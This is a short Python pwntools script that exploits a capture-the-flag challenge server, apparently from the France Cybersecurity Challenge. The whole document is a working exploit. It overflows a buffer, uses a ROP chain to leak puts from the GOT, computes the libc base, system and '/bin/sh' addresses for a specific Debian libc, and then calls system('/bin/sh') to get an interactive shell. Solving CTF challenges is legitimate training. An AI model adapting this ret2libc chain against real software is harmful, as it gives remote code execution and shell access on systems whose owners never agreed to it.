from pwn import *

io = remote('challenges2.france-cybersecurity-challenge.fr', 4008, level='ERROR')
io.recv()

pop_rdi = 0x40073a + 9
puts_got = 0x600fc8
call_puts = 0x4006d1
ret_addr = 0x400656

io.send(b'a' * 40 + p64(pop_rdi) + p64(puts_got) + p64(call_puts) + p64(0) + p64(ret_addr))

received = io.recv()[50:-25]

leak_puts = struct.unpack("<Q", received + b'\x00\x00')[0]
# libc6_2.19-18+deb8u10_amd64
libc_base = leak_puts - 0x6b990
bin_sh = libc_base + 0x1633e8
system = libc_base + 0x41490

io.send(b'a' * 40 + p64(pop_rdi) + p64(bin_sh) + p64(system))

io.interactive()

